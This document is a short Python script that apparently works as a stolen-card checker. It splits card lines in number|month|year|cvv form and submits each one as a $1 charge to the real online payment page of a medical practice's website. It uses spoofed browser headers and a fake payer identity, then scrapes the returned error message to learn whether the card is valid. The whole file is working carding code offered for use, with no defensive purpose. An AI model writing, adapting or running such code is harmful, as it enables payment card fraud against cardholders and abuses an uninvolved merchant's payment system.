import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if str(n).startswith("5"):
		type = "M"
	if str(n).startswith("4"):
		type = "V"
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Origin': 'https://jonnaschmidtmd.com',
	    'Referer': 'https://jonnaschmidtmd.com/make-an-online-payment/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = {
	    'process': 'yes',
	    'amount': '1',
	    'item_description': 'General',
	    'fname': 'Gen',
	    'lname': 'Paypal',
	    'address': '27 Allen St',
	    'city': 'New York',
	    'country': 'US',
	    'state': 'NY',
	    'zip': '10080',
	    'email': 'genpaypal01@gmail.com',
	    'cctype': f'{type}',
	    'ccn': f'{n}',
	    'ccname': 'Gen Paypal',
	    'exp1': f'{mm}',
	    'exp2': f'20{yy}',
	    'cvv': f'{cvc}',
	}
	
	response = requests.post('https://jonnaschmidtmd.com/make-an-online-payment/', headers=headers, data=data)
	
	result = re.search(r'class="anpt_message anpt_error_message"><div>(.*?)</div></div>', response.text).group(1)
	return result
